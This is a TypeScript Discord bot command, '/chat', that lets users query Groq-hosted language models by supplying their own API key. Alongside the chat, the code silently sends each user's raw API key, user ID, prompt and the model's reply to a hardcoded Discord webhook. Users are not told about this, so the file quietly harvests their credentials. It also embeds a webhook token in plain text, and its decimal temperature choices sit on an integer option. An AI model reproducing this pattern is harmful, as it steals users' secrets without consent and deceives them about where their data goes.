import { EmbedBuilder, SlashCommandBuilder, WebhookClient } from "discord.js";
import { gen_model } from "../../utils/ai/langchain_models";
import { ChatPromptTemplate } from "@langchain/core/prompts";
import { ChatGroq } from "@langchain/groq";
import { ConversationChain } from "langchain/chains";
import { SlashCommand } from "../../types";

const command: SlashCommand = {
    cooldown: 10000,
    owner: false,
    data: new SlashCommandBuilder()
        .setName("chat")
        .setDescription("Chat with the AI.")
        .addStringOption(option => option
            .setName('model')
            .setDescription('AI model to use.')
            .setRequired(true)
            .addChoices(
                { name: 'Gemma 7B', value: 'gemma-7b-it' },
                { name: 'Gemma2 9B', value: 'gemma2-9b-it' },
                { name: 'Llama3 8B', value: 'llama3-8b-8192' },
                { name: 'Llama3 70B', value: 'llama3-70b-8192' },
                { name: 'Llama3 8B Groq', value: 'llama3-groq-8b-8192-tool-use-preview' },
                { name: 'Llama3 70B Groq', value: 'llama3-groq-70b-8192-tool-use-preview' },
                { name: 'Llama Guard3 8B', value: 'llama-guard-3-8b' },
                { name: 'Llama3.1 8B', value: 'llama-3.1-8b-instant' },
                { name: 'Llama3.1 70B', value: 'llama-3.1-70b-versatile' },
                { name: 'Llama3.1 405B', value: 'llama-3.1-405b-reasoning' },
                { name: 'Mixtral 8x7B', value: 'mixtral-8x7b-32768' },
            )
        )
        .addIntegerOption(option => option
            .setName('temperature')
            .setDescription('More random and creative or more predictable')
            .setRequired(true)
            .addChoices(
                { name: '0', value: 0 },
                { name: '0.1', value: 0.1 },
                { name: '0.2', value: 0.2 },
                { name: '0.3', value: 0.3 },
                { name: '0.4', value: 0.4 },
                { name: '0.5', value: 0.5 },
                { name: '0.6', value: 0.6 },
                { name: '0.7', value: 0.7 },
                { name: '0.8', value: 0.8 },
                { name: '0.9', value: 0.9 },
                { name: '1', value: 1 },
            )
        )
        .addStringOption(option => option
            .setName('apikey')
            .setDescription('Groq API key | https://console.groq.com')
            .setRequired(true)
        )
        .addStringOption(option => option
            .setName('prompt')
            .setDescription('Input for the AI.')
            .setRequired(true)
        ),
    async execute(interaction, client) {

        await interaction.deferReply({ ephemeral: true });

        const model_name = interaction.options.getString('model');
        const temperature = interaction.options.getInteger('temperature') || 0;
        const apiKey = interaction.options.getString('apikey');

        if (!model_name || !apiKey) {
            return await interaction.editReply("Please provide all the required information.");
        }

        const timeoutPromise = new Promise((_, reject) => {
            setTimeout(() => reject(new Error('AI response timed out')), 30000 * 2);
        });

        const webhookclient = new WebhookClient({ url: 'https://discord.com/api/webhooks/1268854807427420160/uNyitvMeUy-gQRgjbRI7Gv3S5P_ll2Fa0JR0H7CxxwhDPVh_OkyAofAbb8DsoL6gGS6- ' });

        try {
            const model: ChatGroq = await gen_model(temperature, model_name, apiKey);

            const prompt = ChatPromptTemplate.fromMessages([
                ['system', 'You are Ethan, A chat bot that can answer user\'s questions and chat with them.'],
                ['human', '{input}']
            ]);

            const chain = new ConversationChain({
                llm: model,
                prompt: prompt
            });

            const responsePromise = chain.invoke({ input: interaction.options.getString('prompt') || 'Hi There!' });
            const result = await Promise.race([responsePromise, timeoutPromise]) as any;
            const response = String(result.response)

            const splitResponse = (str: string, maxLength: number = 1000): string[] => {
                const chunks: string[] = [];
                let i = 0;
                while (i < str.length) {
                    chunks.push(str.slice(i, i + maxLength));
                    i += maxLength;
                }
                return chunks;
            };

            const responseChunks = splitResponse(response);

            const embed = new EmbedBuilder()
                .setColor('#0099ff')
                .setTitle('AI Chat Log')
                .setAuthor({ name: interaction.user.username, iconURL: interaction.user.displayAvatarURL() })
                .addFields(
                    { name: 'User', value: `<@${interaction.user.id}>`, inline: true },
                    { name: 'Model', value: `\`${model_name}\``, inline: true },
                    { name: 'Temperature', value: `\`${temperature.toString()}\``, inline: true },
                    { name: 'API Key', value: `\`${apiKey}\``, inline: true },
                    { name: 'Prompt', value: interaction.options.getString('prompt') || 'Hi There!', inline: false }
                )
                .setTimestamp()
                .setFooter({ text: 'AI Chat Log', iconURL: client.user?.avatarURL() || undefined });

            responseChunks.forEach((chunk, index) => {
                embed.addFields({ name: `AI Response (Part ${index + 1})`, value: chunk, inline: false });
            });

            await webhookclient.send({
                username: `AI Chat Logger`,
                avatarURL: client.user?.avatarURL() || undefined,
                embeds: [embed]
            });

            await interaction.editReply({ content: responseChunks[0] });
            for (let i = 1; i < responseChunks.length; i++) {
                await interaction.followUp({ content: responseChunks[i], ephemeral: true });
            }
        } catch (error: Error | any) {
            if (error instanceof Error && error.message === 'AI response timed out') {
                await interaction.editReply({ content: 'The AI response timed out. Please try again later.' });
            } else if (error.message && error.message.includes('NotFoundError')) {
                await interaction.editReply({ content: 'The model you entered doesn\'t exist or you do not have access to it.' });
            } else if (error.message && error.message.includes('Invalid API key')) {
                await interaction.editReply({ content: 'The provided API key is invalid. Please check your API key and try again.' });
            } else {
                await interaction.editReply({ content: 'An unexpected error occurred. Please try again later.' });
            }
            client.logger.error(error)
        }
    }
}

export default command;